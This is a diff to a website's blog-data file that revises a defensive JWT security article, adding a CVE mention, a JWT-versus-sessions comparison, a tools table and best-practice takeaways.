-// RS256, httpOnly cookies, short expiration, proper validation
-const token = jwt.sign(payload, privateKey, {
-  algorithm: 'RS256',
-  expiresIn: '15m'
-});
-
-res.cookie('token', token, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'strict'
-});
-
-// Verify with algorithm whitelist
-jwt.verify(token, publicKey, { algorithms: ['RS256'] });
-\`\`\`
+### 3. Palo Alto PAN-OS (2024, CVE-2024-0012)
+- **Vulnerability:** JWT authentication bypass
+- **Impact:** Admin access without credentials
+- **Fix:** Proper signature verification
 
 ---
 
-## Resources
+## JWT vs Session Comparison
 
-- JWT.io: https://jwt.io (Token debugger & documentation)
-- OWASP JWT Cheat Sheet
-- RFC 7519: JSON Web Token (JWT)
-- Auth0 JWT Handbook
-- Critical JWT Security Flaws: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+| Feature | JWT | Sessions |
+|---------|-----|----------|
+| Server storage | None (stateless) | Required |
+| Scalability | Excellent | Requires shared store |
+| Revocation | Complex | Immediate |
+| Mobile/API | Ideal | Requires cookies |
+| Token size | Larger (payload) | Small (session ID) |
+| Best for | APIs, microservices | Traditional web apps |
 
 ---
 
-## Key Takeaways
+## Tools & Resources
 
-1. **RS256 over HS256** - Asymmetric > Symmetric
-2. **Short expiration** - 15-30 min max
-3. **httpOnly cookies** - Prevent XSS theft
-4. **Refresh token rotation** - Implement token revocation
-5. **Always verify** - Not just decode`,
-    date: "2026-02-16",
+| Tool | Purpose | URL |
+|------|---------|-----|
+| jwt.io | Token debugger | https://jwt.io |
+| jwt_tool | Penetration testing | GitHub |
+| jose | JS JWT library | npmjs.com/jose |
+| PyJWT | Python library | pypi.org/project/PyJWT |
+
+---
+
+## SEO Summary & Key Takeaways
+
+1. **Use RS256/ES256** — Asymmetric algorithms prevent secret leakage
+2. **15-minute expiration** — Limit blast radius of stolen tokens
+3. **httpOnly cookies** — Eliminate XSS token theft
+4. **Whitelist algorithms** — Prevent algorithm confusion attacks
+5. **Validate all claims** — aud, iss, exp are mandatory
+
+**Next steps:** Audit your JWT implementation against the checklist above. Use jwt.io to decode and inspect your tokens (never in production!).
+
+---
+
+*Last updated: February 2025 | Sources: OWASP, Auth0, RFC 7519, Postman API Report 2024*
+`,
+    date: "2026-02-15",
     author: "SCR Team",
     category: "Authentication",
-    tags: ["JWT", "Authentication", "Token Security", "Best Practices"],
-    readTime: "12 min read",
+    tags: ["JWT", "Authentication", "Token Security", "Best Practices", "API Security"],
+    readTime: "15 min read",
   },
   // Add extended blog posts
   ...extendedBlogPosts,
